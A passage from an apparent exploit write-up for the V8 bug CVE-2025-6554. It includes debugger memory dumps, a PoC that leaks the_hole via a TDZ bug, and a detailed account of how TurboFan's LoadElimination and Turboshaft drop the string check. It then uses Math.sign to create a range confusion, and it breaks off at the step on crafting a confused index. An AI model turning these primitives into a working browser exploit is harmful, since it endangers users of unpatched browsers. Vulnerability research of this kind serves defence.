<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> instance descriptors <span class="er">(</span><span class="ex">own</span><span class="kw">)</span> <span class="co">#0: 0x1100000007f1 &lt;DescriptorArray[0]&gt;</span></span>
<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> prototype: 0x11000000002d <span class="op">&lt;</span>null<span class="op">&gt;</span></span>
<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> constructor: 0x11000000002d <span class="op">&lt;</span>null<span class="op">&gt;</span></span>
<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> dependent code: 0x1100000007cd <span class="op">&lt;</span>Other heap object <span class="er">(</span><span class="ex">WEAK_ARRAY_LIST_TYPE</span><span class="kw">)</span><span class="op">&gt;</span></span>
<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> construction counter: 0</span>
<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a><span class="ex">DebugPrint:</span> 0x1100000007d9: <span class="pp">[</span><span class="ss">Hole</span><span class="pp">]</span> in ReadOnlySpace</span>
<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>the_hole_value<span class="op">&gt;</span></span>
<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x110000000745:</span> <span class="pp">[</span><span class="ss">Map</span><span class="pp">]</span> in ReadOnlySpace</span>
<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> map: 0x110000000475 <span class="op">&lt;</span>MetaMap <span class="er">(</span><span class="ex">0x11000000002d</span> <span class="op">&lt;</span>null<span class="op">&gt;</span><span class="kw">)</span><span class="op">&gt;</span></span>
<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> type: HOLE_TYPE</span>
<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> instance size: 12</span>
<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> elements kind: HOLEY_ELEMENTS</span>
<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> enum length: invalid</span>
<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> stable_map</span>
<span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> non-extensible</span>
<span id="cb15-33"><a href="#cb15-33" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> back pointer: 0x110000000011 <span class="op">&lt;</span>undefined<span class="op">&gt;</span></span>
<span id="cb15-34"><a href="#cb15-34" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> prototype_validity_cell: 0</span>
<span id="cb15-35"><a href="#cb15-35" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> instance descriptors <span class="er">(</span><span class="ex">own</span><span class="kw">)</span> <span class="co">#0: 0x1100000007f1 &lt;DescriptorArray[0]&gt;</span></span>
<span id="cb15-36"><a href="#cb15-36" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> prototype: 0x11000000002d <span class="op">&lt;</span>null<span class="op">&gt;</span></span>
<span id="cb15-37"><a href="#cb15-37" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> constructor: 0x11000000002d <span class="op">&lt;</span>null<span class="op">&gt;</span></span>
<span id="cb15-38"><a href="#cb15-38" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> dependent code: 0x1100000007cd <span class="op">&lt;</span>Other heap object <span class="er">(</span><span class="ex">WEAK_ARRAY_LIST_TYPE</span><span class="kw">)</span><span class="op">&gt;</span></span>
<span id="cb15-39"><a href="#cb15-39" aria-hidden="true" tabindex="-1"></a> <span class="ex">-</span> construction counter: 0</span>
<span id="cb15-40"><a href="#cb15-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-41"><a href="#cb15-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-42"><a href="#cb15-42" aria-hidden="true" tabindex="-1"></a><span class="ex">Thread</span> 1 <span class="st">&quot;d8&quot;</span> received signal SIGTRAP, Trace/breakpoint trap.</span>
<span id="cb15-43"><a href="#cb15-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x00005555580d0c55</span> in v8::base::OS::DebugBreak<span class="er">(</span><span class="kw">)</span> <span class="kw">()</span></span>
<span id="cb15-44"><a href="#cb15-44" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb15-45"><a href="#cb15-45" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> x/10wx 0x11000005d421-1 <span class="co"># string object</span></span>
<span id="cb15-46"><a href="#cb15-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x11000005d420:</span>  0x00000155  0x4f97c2ba  0x0000000b  0x656d6f73</span>
<span id="cb15-47"><a href="#cb15-47" aria-hidden="true" tabindex="-1"></a>                      <span class="ex">^</span> map      ^ hash       ^ len</span>
<span id="cb15-48"><a href="#cb15-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x11000005d430:</span>  0x72747320  0x00676e69  0x00000155  0x272231aa</span>
<span id="cb15-49"><a href="#cb15-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x11000005d440:</span>  0x00000007  0x48656854</span>
<span id="cb15-50"><a href="#cb15-50" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> x/10wx 0x1100000007d9-1</span>
<span id="cb15-51"><a href="#cb15-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x1100000007d8:</span>  0x00000745  0xfff7ffff  0xfff7ffff  0x00000795</span>
<span id="cb15-52"><a href="#cb15-52" aria-hidden="true" tabindex="-1"></a>                      <span class="ex">^</span> map        ^ <span class="pp">??</span>        ^ <span class="pp">??</span></span>
<span id="cb15-53"><a href="#cb15-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x1100000007e8:</span>  0x000007bd  0x000007bd  0x0000071d  0x00000000</span>
<span id="cb15-54"><a href="#cb15-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x1100000007f8:</span>  0x00000000  0x00000000</span></code></pre></div>
<div class="sourceCode" id="cb16"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">hax</span>(trigger) {</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Leak the_hole using the TDZ bug</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> x<span class="op">;</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">delete</span> x<span class="op">?.</span>[y]<span class="op">?.</span><span class="at">a</span><span class="op">;</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> hole <span class="op">=</span> y<span class="op">;</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> y<span class="op">;</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Create a property that can be either the_hole or a string</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> o <span class="op">=</span> {}<span class="op">;</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>  o<span class="op">.</span><span class="at">maybe_hole</span> <span class="op">=</span> trigger <span class="op">?</span> hole <span class="op">:</span> <span class="st">&quot;not the hole&quot;</span><span class="op">;</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Access the length property</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> len <span class="op">=</span> o<span class="op">.</span><span class="at">maybe_hole</span><span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>  <span class="co">// inferred: (0, 535870888)</span></span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>  <span class="co">// actual:   (-524289, 535870888) when trigger=true</span></span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
<p>During TurboFan’s optimization, the training phase
(<code>trigger=false</code>) allows TurboFan to observe that
<code>o.maybe_hole</code> is always a string, leading to optimization
that generates optimized code assuming <code>.length</code> is always
positive.</p>
<h3 id="step-2-removing-the-type-check">Step 2: Removing the Type
Check</h3>
<p>How we can preventing deoptimization when <code>the_hole</code> is
passed? For <code>o.maybe_hole.length</code>, the compiler initially
generates:</p>
<ol type="1">
<li><strong><code>LoadField</code></strong> node: Loads
<code>o.maybe_hole</code></li>
<li><strong><code>CheckString</code></strong> node: Verifies the loaded
value is a string, deoptimizes if not</li>
<li><strong><code>StringLength</code></strong> node: Reads the length
field at offset +8</li>
</ol>
<p>We need <code>CheckString</code> to be removed. This will happen
through optimization phases:</p>
<p><strong>LoadEliminationPhase</strong> - runs multiple reducers in a
single GraphReducer pass:</p>
<ul>
<li><strong>LoadElimination reducer</strong> (<a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/load-elimination.cc;l=1021-1032;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>LoadElimination::ReduceLoadField</code></a>):
<ul>
<li>Finds that <code>o.maybe_hole</code> was previously stored
(StoreField), so the value can be reused from cache</li>
<li>The cached value is a Phi node with type
<code>(Hole | HeapConstant("not the hole"))</code></li>
<li>LoadField has type <code>NonInternal</code></li>
<li>Checks:
<code>(Hole | HeapConstant("not the hole")).Is(NonInternal)</code>?
<ul>
<li><code>Hole.Is(NonInternal)</code> = false (Hole is standalone, not
in hierarchy)</li>
<li>Result: <strong>false</strong> -&gt; TypeGuard needed</li>
</ul></li>
<li>Creates TypeGuard with
<code>Type::Intersect(NonInternal, (Hole | HeapConstant(...)))</code>
<ul>
<li>The intersection filters out Hole (bitwise AND = 0)</li>
<li>Keeps only the HeapConstant String part</li>
</ul></li>
<li>Replaces LoadField with TypeGuard via
<code>ReplaceWithValue()</code>
<ul>
<li>All uses of LoadField (including CheckString) now use TypeGuard
instead</li>
</ul></li>
</ul></li>
<li><strong>TypedOptimization reducer</strong> (<a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/typed-optimization.cc;l=302-310;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>TypedOptimization::ReduceCheckString</code></a>):
<ul>
<li>Now sees <code>CheckString(TypeGuard(...))</code> where TypeGuard
has String type</li>
<li>Checks: <code>if (input_type.Is(Type::String()))</code> -
<strong>true</strong></li>
<li>Eliminates CheckString, replacing it with the TypeGuard
directly</li>
<li>Graph becomes:
<code>Phi -&gt; TypeGuard -&gt; StringLength</code></li>
</ul></li>
</ul>
<p><strong>Turboshaft BuildGraph phase</strong> (<a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/graph-builder.cc;l=2449-2450;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>turboshaft::GraphBuilder::Process</code></a>):</p>
<ul>
<li>Converts TurboFan nodes to Turboshaft operations</li>
<li>For <code>TypeGuard</code> nodes: <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/graph-builder.cc;l=110-114;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>return Map(node-&gt;InputAt(0))</code></a>
<ul>
<li><code>Map()</code> looks up the already-converted Turboshaft
operation for the input (the Phi)</li>
<li>Returns that operation directly without creating any new
operation</li>
<li>TypeGuard is completely eliminated - there’s no
<code>TypeGuardOp</code> in Turboshaft</li>
</ul></li>
<li>The TurboFan graph
<code>Phi -&gt; TypeGuard -&gt; StringLength</code> becomes just
<code>Phi -&gt; StringLength</code> in Turboshaft</li>
</ul>
<p>Result: <code>StringLength</code> reads directly from the Phi which
can contain <code>the_hole</code> at runtime, returning -524289 without
any type check.</p>
<p><strong>Why is TypeGuard elimination normally safe?</strong></p>
<p>The TypeGuard’s type is the <strong>intersection</strong> of what the
compiler expects and what was observed during profiling. When TypeGuard
is eliminated, this type information remains attached to the SSA value.
Subsequent optimizations trust this type.</p>
<p>If you tried to pass a regular object (not String):</p>
<ul>
<li>During profiling: <code>o.value = {custom: "object"}</code> -&gt;
cached type is <strong>Object</strong></li>
<li><code>Type::Intersect(String, Object) = None</code> (empty type - no
overlap)</li>
<li>TypeGuard would have type <strong>None</strong>, recognized as
impossible/dead code</li>
<li>CheckString would <strong>not be eliminated</strong> and would
deoptimize at runtime</li>
</ul>
<p><strong>Why does <code>the_hole</code> bypass this safety
mechanism?</strong></p>
<p>The vulnerability occurs because of how LoadElimination decides
whether to create a TypeGuard. The critical code is at <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/load-elimination.cc;l=1023-1024;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>load-elimination.cc:1023-1024</code></a>:</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Introduce a TypeGuard if the type of the {replacement} node is not</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="co">// a subtype of the original {node}&#39;s type.</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(!</span>NodeProperties<span class="op">::</span>GetType<span class="op">(</span>replacement<span class="op">)</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>         <span class="op">.</span>Is<span class="op">(</span>NodeProperties<span class="op">::</span>GetType<span class="op">(</span>node<span class="op">)))</span> <span class="op">{</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>  Type <span class="dt">replacement_type</span> <span class="op">=</span> Type<span class="op">::</span>Intersect<span class="op">(</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>      NodeProperties<span class="op">::</span>GetType<span class="op">(</span>node<span class="op">),</span></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>      NodeProperties<span class="op">::</span>GetType<span class="op">(</span>replacement<span class="op">),</span> graph<span class="op">()-&gt;</span>zone<span class="op">());</span></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>  replacement <span class="op">=</span> effect <span class="op">=</span></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>      graph<span class="op">()-&gt;</span>NewNode<span class="op">(</span>common<span class="op">()-&gt;</span>TypeGuard<span class="op">(</span><span class="dt">replacement_type</span><span class="op">),</span></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>                       replacement<span class="op">,</span> effect<span class="op">,</span> control<span class="op">);</span></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>  NodeProperties<span class="op">::</span>SetType<span class="op">(</span>replacement<span class="op">,</span> <span class="dt">replacement_type</span><span class="op">);</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>LoadElimination finds that <code>o.maybe_hole</code> was stored
(StoreField) and can be reused when loading (LoadField). It checks:</p>
<ul>
<li><code>replacement</code> = Phi node with type
<code>(Hole | HeapConstant("not the hole"))</code></li>
<li><code>node</code> = LoadField with type
<code>NonInternal</code></li>
<li>Question: Is
<code>(Hole | HeapConstant("not the hole")).Is(NonInternal)</code>?</li>
</ul>
<p><strong>V8’s type hierarchy</strong> from <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turbofan-types.h;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09"><code>turbofan-types.h</code></a>:</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Type bitset definitions</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>Hole<span class="op">,</span>                     <span class="dt">uint64_t</span><span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">33</span><span class="op">)</span>   <span class="co">// bit 33 - STANDALONE</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>Array<span class="op">,</span>                    <span class="dt">uint64_t</span><span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">25</span><span class="op">)</span>   <span class="co">// bit 25</span></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>OtherString<span class="op">,</span>              <span class="dt">uint64_t</span><span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">5</span><span class="op">)</span>    <span class="co">// bit 5</span></span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>InternalizedString<span class="op">,</span>       <span class="dt">uint64_t</span><span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">14</span><span class="op">)</span>   <span class="co">// bit 14</span></span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>String<span class="op">,</span>                   kInternalizedString <span class="op">|</span> kOtherString<span class="op">)</span>  <span class="co">// bits 5|14</span></span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Type hierarchy</span></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>DetectableObject<span class="op">,</span>         kArray <span class="op">|</span> kFunction <span class="op">|</span> <span class="op">...)</span></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>Object<span class="op">,</span>                   kDetectableObject <span class="op">|</span> kOtherUndetectable<span class="op">)</span></span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>Receiver<span class="op">,</span>                 kObject <span class="op">|</span> kProxy <span class="op">|</span> kWasmObject<span class="op">)</span></span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>Primitive<span class="op">,</span>                kBigInt <span class="op">|</span> kNonBigIntPrimitive<span class="op">)</span></span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>V<span class="op">(</span>NonInternal<span class="op">,</span>              kPrimitive <span class="op">|</span> kReceiver<span class="op">)</span>  <span class="co">// The target type</span></span></code></pre></div>
<p><strong>Type hierarchy relationships:</strong></p>
<figure>
<img src="/assets/imgs/cve-2025-6554-the-rabbit-hole/types.png"
alt="Type hierarchy relationships" />
<figcaption aria-hidden="true">Type hierarchy relationships</figcaption>
</figure>
<p><strong>For a union to be a subtype, ALL members must be
subtypes:</strong></p>
<ul>
<li><p><code>(Hole | String).Is(NonInternal)</code> requires both:</p>
<ul>
<li><code>Hole.Is(NonInternal)</code> = <strong>false</strong> (Hole is
standalone)</li>
<li><code>String.Is(NonInternal)</code> = true</li>
<li>Result: <strong>false</strong> -&gt; TypeGuard is created</li>
</ul></li>
<li><p><code>(Array | String).Is(NonInternal)</code> requires both:</p>
<ul>
<li><code>Array.Is(NonInternal)</code> = true</li>
<li><code>String.Is(NonInternal)</code> = true</li>
<li>Result: <strong>true</strong> -&gt; TypeGuard <strong>not</strong>
created</li>
</ul></li>
</ul>
<p><strong>The exploitation flow:</strong></p>
<ol type="1">
<li>LoadElimination sees <code>(Hole | String).Is(NonInternal)</code> =
false</li>
<li>Creates TypeGuard with
<code>Type::Intersect(NonInternal, (Hole | String))</code></li>
<li>Type::Intersect filters out Hole (bitwise AND = 0), keeps
String</li>
<li>TypeGuard gets type String, CheckString is eliminated</li>
<li>Turboshaft eliminates TypeGuard entirely (no runtime check)</li>
<li>At runtime, <code>the_hole</code> flows through unchecked</li>
<li>StringLength reads offset +8 from <code>the_hole</code> =
-524289</li>
</ol>
<p><strong>Why can’t you use Array instead of Hole?</strong></p>
<p>If you try <code>o.value = trigger ? [1,2,3] : "string"</code>:</p>
<ul>
<li>Phi type: <code>(Array | String)</code></li>
<li><code>(Array | String).Is(NonInternal)</code> = true</li>
<li><a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/load-elimination.cc;l=1023;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">LoadElimination
condition at line 1023</a>: <code>!true</code> = false</li>
<li><strong>No TypeGuard created</strong></li>
<li>CheckString remains in the graph</li>
<li>At runtime with <code>trigger=true</code>, CheckString deoptimizes:
“not a String”</li>
</ul>
<p>We can see this assumptions at runtime with this test:</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">test_hole</span>(trigger) {</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> x<span class="op">;</span></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">delete</span> x<span class="op">?.</span>[y]<span class="op">?.</span><span class="at">a</span><span class="op">;</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> hole <span class="op">=</span> y<span class="op">;</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> y<span class="op">;</span></span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> o <span class="op">=</span> {}<span class="op">;</span></span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>  o<span class="op">.</span><span class="at">val</span> <span class="op">=</span> trigger <span class="op">?</span> hole <span class="op">:</span> <span class="st">&quot;string&quot;</span><span class="op">;</span></span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> o<span class="op">.</span><span class="at">val</span><span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">test_array</span>(trigger) {</span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> o <span class="op">=</span> {}<span class="op">;</span></span>
<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>  o<span class="op">.</span><span class="at">val</span> <span class="op">=</span> trigger <span class="op">?</span> [<span class="dv">1</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">3</span>] <span class="op">:</span> <span class="st">&quot;string&quot;</span><span class="op">;</span></span>
<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> o<span class="op">.</span><span class="at">val</span><span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="op">%</span><span class="fu">PrepareFunctionForOptimization</span>(test_hole)<span class="op">;</span></span>
<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="op">%</span><span class="fu">PrepareFunctionForOptimization</span>(test_array)<span class="op">;</span></span>
<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">10</span><span class="op">;</span> i<span class="op">++</span>) {</span>
<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a>  <span class="fu">test_hole</span>(<span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a>  <span class="fu">test_array</span>(<span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a><span class="op">%</span><span class="fu">OptimizeFunctionOnNextCall</span>(test_hole)<span class="op">;</span></span>
<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a><span class="op">%</span><span class="fu">OptimizeFunctionOnNextCall</span>(test_array)<span class="op">;</span></span>
<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a><span class="fu">print</span>(<span class="fu">test_hole</span>(<span class="kw">true</span>))<span class="op">;</span> <span class="co">// prints -524289, no deoptimization</span></span>
<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a><span class="fu">print</span>(<span class="fu">test_array</span>(<span class="kw">true</span>))<span class="op">;</span> <span class="co">// prints 3, but deoptimizes</span></span></code></pre></div>
<p>Running with
<code>d8 --allow-natives-syntax --trace-deopt</code>:</p>
<ul>
<li><code>test_hole(true)</code>: No deopt output - TypeGuard was
created then eliminated</li>
<li><code>test_array(true)</code>:
<code>[bailout (reason: not a String)]</code> - CheckString
remained</li>
</ul>
<p>Both <code>(bit 33) &amp; (bits 5|14) = 0</code> and
<code>(bit 25) &amp; (bits 5|14) = 0</code>, but only
<code>the_hole</code> bypasses checks because it’s <strong>outside the
type hierarchy</strong> that LoadElimination checks with
<code>.Is(NonInternal)</code>.</p>
<h3 id="step-3-range-confusion-with-math.sign">Step 3: Range Confusion
with <code>Math.sign()</code></h3>
<p>We use <code>Math.sign()</code> to create divergent behavior between
inferred and actual ranges:</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> len <span class="op">=</span> o<span class="op">.</span><span class="at">maybe_hole</span><span class="op">.</span><span class="at">length</span><span class="op">;</span> <span class="co">// infer: (0, 535870888), actual: (-524289, 535870888)</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> sign <span class="op">=</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">sign</span>(len)<span class="op">;</span> <span class="co">// infer: (0, 1),         actual: (-1, 1)</span></span></code></pre></div>
<p>During training, <code>len</code> is always positive, so
<code>Math.sign(len)</code> is always 1. TurboFan’s <a
href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turbofan-typer.cc;l=2425;drc=609a85c2a1bd77d6f6905369f4bc4fcf34c5db09">Typer
phase</a> infers <code>sign ∈ (0, 1)</code>. But when
<code>the_hole</code> is passed, <code>sign = -1</code>, which is
outside the inferred range!</p>
<pre><code>TurboFan Pipeline with Type Confusion:

Step 1: Type Feedback (Ignition)
+-----------------------------------------------+
|     o.maybe_hole = &quot;string&quot;                   |
|  -&gt; o.maybe_hole is String                    |
|  -&gt; length in [0, 535870888]                  |
|  -&gt; Math.sign(length) = 1                     |
+------------------+----------------------------+
                   |
                   v
Step 2: Optimization (TurboFan Typer)
+-----------------------------------------------+
| Node: LoadField(o, &quot;maybe_hole&quot;) -&gt; String    |
| Node: StringLength              -&gt; Range(0+)  |
| Node: Math.sign(length)         -&gt; Range(1)   |
+------------------+----------------------------+
                   |
                   v
Step 3: Exploitation
+-----------------------------------------------+
| o.maybe_hole = the_hole                       |
|  -&gt; the_hole.length = -524289                 |
|  -&gt; Math.sign(-524289) = -1                   |
+-----------------------------------------------+</code></pre>
<h3 id="step-4-crafting-a-confused-index">Step 4: Crafting a Confused
Index</h3>
<p>We chain arithmetic operations to amplify the confusion:</p>
<div class="sourceCode" id="cb22"><pre
